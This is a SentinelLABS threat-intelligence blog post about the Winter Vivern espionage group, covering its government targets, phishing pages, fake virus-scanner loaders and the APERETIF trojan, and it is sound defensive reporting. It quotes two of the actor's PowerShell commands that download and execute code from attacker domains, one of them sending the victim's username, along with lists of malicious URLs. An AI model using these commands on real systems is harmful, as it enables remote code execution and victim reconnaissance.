	<section class="archive-single-post labs" style="">
		<div class="container">
			<div class="inner">
				<div class="primary-wrap">
					<div class="content-wrap">
						<div id="primary" class="content-area">
							<div class="primary-inner">
								<article id="post-77315" class="post-77315 labs type-labs status-publish has-post-thumbnail hentry tag-cyber-espionage labs_category-advanced-persistent-threat">
									<div class="context wow fadeInRight">
										<div class="flourish"></div>
										<div class="heading">
											<div class="info">
												<a href="https://www.sentinelone.com/labs/category/advanced-persistent-threat/">Advanced Persistent Threat</a>											</div>
											<h1 class="entry-title">Winter Vivern | Uncovering a Wave of Global Espionage</h1>										</div>
										<div class="meta">
											<span class="author">
												<span><a href="https://www.sentinelone.com/blog/author/tomhegel/">Tom Hegel</a></span>											</span>
											/
											<span class="date">
												<a href="https://www.sentinelone.com/blog/2023/03/" rel="nofollow">
													<time datetime="2023-03-16">March 16, 2023</time>
												</a>
											</span>
										</div>
									</div>
									<div class="entry-content">
										<h2>Executive Summary</h2>
<ul>
<li aria-level="1">SentinelLABS has conducted an investigation into Winter Vivern Advanced Persistent Threat (APT) activity, leveraging observations made by The Polish CBZC and Ukraine CERT. Our research has uncovered a previously unknown set of espionage campaigns and targeting activities conducted by this threat actor.</li>
<li aria-level="1">Our analysis indicates that Winter Vivern&#8217;s activities are closely aligned with global objectives that support the interests of Belarus and Russia&#8217;s governments. The APT has targeted a variety of government organizations, and in a rare instance, a private telecommunication organization.</li>
<li aria-level="1">The threat actor employs various tactics, such as phishing websites, credential phishing, and deployment of malicious documents, that are tailored to the targeted organization&#8217;s specific needs. This results in the deployment of custom loaders and malicious documents, which enable unauthorized access to sensitive systems and information.</li>
</ul>
<h2>Background on Winter Vivern</h2>
<p>The Winter Vivern Advanced Persistent Threat (APT) is a noteworthy yet relatively underreported group that operates with pro-Russian objectives. <a href="https://www.domaintools.com/resources/blog/winter-vivern-a-look-at-re-crafted-government-maldocs/" target="_blank" rel="noopener noreferrer">DomainTools initially publicized</a> the group in early 2021, naming it based on an initial command-and-control beacon URL string &#8220;wintervivern,&#8221; which is no longer in use. Subsequently, <a href="https://lab52.io/blog/winter-vivern-all-summer/" target="_blank" rel="noopener noreferrer">Lab52 shared</a> additional analysis several months later, identifying new activity associated with Winter Vivern.</p>
<p>The group has avoided public disclosure since then, until recent attacks targeting Ukraine. A part of a Winter Vivern campaign was reported in recent weeks <a href="https://cbzc.policja.gov.pl/bzc/aktualnosci/123,Cyberprzestepcy-podszywaja-sie-pod-CBZC.html" target="_blank" rel="noopener noreferrer">by the Polish CBZC</a>, and then the <a href="https://cert.gov.ua/article/3761023" target="_blank" rel="noopener noreferrer">Ukraine CERT</a> as UAC-0114. In this activity, CERT-UA and the CBZC collaborated on the release of private technical details which assisted in our research to identify a wider set of activity on the threat actor, in addition to new victims and previously unknown specific technical details. Overall, we find that the Winter Vivern APT is a resource-limited but highly creative group that shows restraint in the scope of their attacks. Our analysis indicates that Winter Vivern activity aligns closely with global objectives that support the interests of Belarus and Russia&#8217;s governments.</p>
<h2>Targeted Organizations</h2>
<p>Our analysis of Winter Vivern&#8217;s past activity indicates that the APT has targeted various government organizations since 2021, including those in Lithuania, India, Vatican, and Slovakia.</p>
<p>Recently linked campaigns reveal that Winter Vivern has targeted Polish government agencies, the Ukraine Ministry of Foreign Affairs, the Italy Ministry of Foreign Affairs, and individuals within the Indian government. Of particular interest is the APT&#8217;s targeting of private businesses, including telecommunications organizations that support Ukraine in the ongoing war.</p>
<p>The threat actor’s targeting of a range of government and private entities highlights the need for increased vigilance as their operations include a global set of targets directly and indirectly involved in the war.</p>
<h2>Luring Methodology</h2>
<p>Winter Vivern&#8217;s tactics have included the use of malicious documents, often crafted from authentic government documents publicly available or tailored to specific themes. More recently, the group has utilized a new lure technique that involves mimicking government domains to distribute malicious downloads.</p>
<p>In early 2023, Winter Vivern targeted specific government websites by creating individual pages on a single malicious domain that closely resembled those of Poland&#8217;s Central Bureau for Combating Cybercrime, the Ukraine Ministry of Foreign Affairs, and the Security Service of Ukraine.</p>
<figure id="attachment_76672" aria-describedby="caption-attachment-76672" style="width: 1868px" class="wp-caption aligncenter"><img fetchpriority="high" decoding="async" class="alignnone size-full wp-image-77319" src="https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-2.png" alt="Malicious Page Mimicking cbzc.policja.gov.pl" width="1868" height="1396" srcset="https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-2.png 1868w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-2-300x224.png 300w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-2-1024x765.png 1024w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-2-768x574.png 768w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-2-1536x1148.png 1536w" sizes="(max-width: 1868px) 100vw, 1868px" /><figcaption id="caption-attachment-76672" class="wp-caption-text">Malicious Page Mimicking <em>cbzc.policja.gov.pl</em></figcaption></figure>
<p>In mid 2022 the attackers also made an interesting, lesser observed, use of government email credential phishing webpages. One example is <code>ocspdep[.]com</code>, which was used in targeting users of the Indian government&#8217;s legitimate email service <code>email.gov.in</code>.</p>
<figure id="attachment_76672" aria-describedby="caption-attachment-76672" style="width: 1868px" class="wp-caption aligncenter"><img decoding="async" class="alignnone size-full wp-image-77318" src="https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-3.png" alt="email.gov.in Login Page" width="1868" height="1496" srcset="https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-3.png 1868w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-3-300x240.png 300w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-3-1024x820.png 1024w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-3-768x615.png 768w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-3-1536x1230.png 1536w" sizes="(max-width: 1868px) 100vw, 1868px" /><figcaption id="caption-attachment-76672" class="wp-caption-text"><em>email.gov.in</em> Login Page</figcaption></figure>
<p>Looking back at less recent activity, we can see in December 2022 the group likely targeted individuals associated with the <code>Hochuzhit.com</code> (“I Want to Live”) project, the Ukraine government website offering guidance and instructions to Russian and Belarus Armed Forces seeking to voluntarily surrender in the war. In these attacks the threat actor made use of a macro-enabled Excel spreadsheet to infect the target.</p>
<p>When the threat actor seeks to compromise the organization beyond the theft of legitimate credentials, Winter Vivern tends to rely on shared toolkits, and the abuse of legitimate Windows tools.</p>
<h2>View Into The Arsenal</h2>
<p>Winter Vivern APT falls into a category of scrappy threat actors, being quite resourceful and able to accomplish a lot with potentially limited resources while willing to be flexible and creative in their approach to problem-solving.</p>
<p>Recent campaigns demonstrate the group&#8217;s use of lures to initiate the infection process, utilizing batch scripts disguised as virus scanners to prompt downloads of malware from attacker-controlled servers.</p>
<figure id="attachment_76672" aria-describedby="caption-attachment-76672" style="width: 1870px" class="wp-caption aligncenter"><img decoding="async" class="alignnone size-full wp-image-77317" src="https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-4.png" alt="Fake Virus Scan Loaders" width="1870" height="1002" srcset="https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-4.png 1870w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-4-300x161.png 300w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-4-1024x549.png 1024w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-4-768x412.png 768w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-4-1536x823.png 1536w" sizes="(max-width: 1870px) 100vw, 1870px" /><figcaption id="caption-attachment-76672" class="wp-caption-text">Fake Virus Scan Loaders</figcaption></figure>
<p>In the case of malicious documents, such as the Hochu Zhit themed XLS files, PowerShell is called through a macro. Specifically, <code>Invoke-Expression</code> cmdlet is executed, beaconing to the malicious destination of <code>ocs-romastassec[.]com/goog_comredira3cf7ed34f8.php</code>.</p>
<pre>powershell.exe -noexit -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
iex (new-object net.webclient).DownloadString('hxxps://ocs-romastassec[.]com/goog_comredira3cf7ed34f8.php')"
</pre>
<p>One malware family of recent activity is APERETIF, named by CERT-UA based on the development PDB path inside the sample. We identified a related sample following similar use, although it is less complete in malicious design. These samples align with the theme of attacks mimicking a virus scanner, presenting users with the fake scan results similar to the script loaders. Known samples are PE32 executables, written in Visual C++, with a compilation timestamp of May 2021. We assess the threat actor shifted from these original executables to the delivery of batch files with PowerShell scripting, with overlap in their use.</p>
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 60.0%; height: 24px;">f39b260a9209013d9559173f12fbc2bd5332c52a</td>
<td style="width: 40.0%; height: 24px;">C:\Users\user_1\source\repos\Aperitivchick\Release\SystemProtector.pdb</td>
</tr>
<tr style="height: 24px;">
<td style="width: 60.0%; height: 24px;">a19d46251636fb46a013c7b52361b7340126ab27</td>
<td style="width: 40.0%; height: 24px;">C:\Users\user_1\source\repos\Aperitivchick 2\Release\SystemProtector.pdb</td>
</tr>
</tbody>
</table>
<p>APERETIF is a trojan, automating the collection of victim details, maintaining access, and beaconing outbound the actor-controlled domain <code>marakanas[.]com</code>. As with the previous script, the trojan makes use of <code>whomami</code> within PowerShell in its initial activity to beacon outbound for further instructions and/or downloads.</p>
<pre>actor-controlled.exe -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
$a=whoami; 
iex (New-Object Net.WebClient).DownloadString("""hxxps://marakanas[.]com/Kkdn7862Jj6h2oDASGmpqU4Qq4q4.php?idU=$a""")"
</pre>
<p>APERETIF also uses the <code>signatures.php?id=1</code> URI through HTTPS GET requests. The group made use of compromised WordPress websites to host the malware, such as with <code>hxxps://applesaltbeauty[.]com/wordpress/wp-includes/widgets/classwp/521734i</code> and <code>hxxps://natply[.]com/wordpress/wp-includes/fonts/ch/097214o</code> serving as the download location for APERETIF during initial attack stages.</p>
<p>Moreover, Winter Vivern employs other intrusion techniques, such as exploiting application vulnerabilities to compromise specific targets or staging servers. An attacker-controlled server was found to host a login page for the Acunetix web application vulnerability scanner, which may serve as a supplementary resource for scanning target networks and potentially used to compromise WordPress sites for malware hosting purposes.</p>
<figure id="attachment_76672" aria-describedby="caption-attachment-76672" style="width: 1338px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-77316" src="https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-5.png" alt="Acunetix Vulnerability Scanner Login" width="1338" height="1294" srcset="https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-5.png 1338w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-5-300x290.png 300w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-5-1024x990.png 1024w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-5-768x743.png 768w, https://www.sentinelone.com/wp-content/uploads/2023/03/ateam_draft__Winter_Vivern__Uncovering_a_Wave_of_Global_Espionage_-_Google_Docs-5-24x24.png 24w" sizes="auto, (max-width: 1338px) 100vw, 1338px" /><figcaption id="caption-attachment-76672" class="wp-caption-text">Acunetix Vulnerability Scanner Login</figcaption></figure>
<h2>Conclusion</h2>
<p>The Winter Vivern cyber threat actor, whose operations of espionage have been discussed in this research, has been able to successfully carry out their attacks using simple yet effective attack techniques and tools. Their ability to lure targets into the attacks, and their targeting of governments and high-value private businesses demonstrate the level of sophistication and strategic intent in their operations. The dynamic set of TTPs and their ability to evade the public eye has made them a formidable force in the cyber domain.</p>

										</h4>
										<div class="entry-author-description" itemprop="description">An accomplished cybersecurity researcher and a leader in the threat intelligence space, with a background of tracking some of the most interesting and unique threat actors globally. Tom's dedication lies in driving cutting-edge cyber threat intelligence and research, collaborating with top-tier analysts and organizations worldwide.

As a Distinguished Threat Researcher and Research Lead at SentinelLABS, Tom spearheads investigations into the most sophisticated nation-state and criminal threat actors, uncovering operations from adversaries across Russia, China, Iran, North Korea, India, and beyond. His work has led to the discovery of new mercenary groups, emerging geopolitical cyber campaigns, and critical insights into global conflicts.</div>
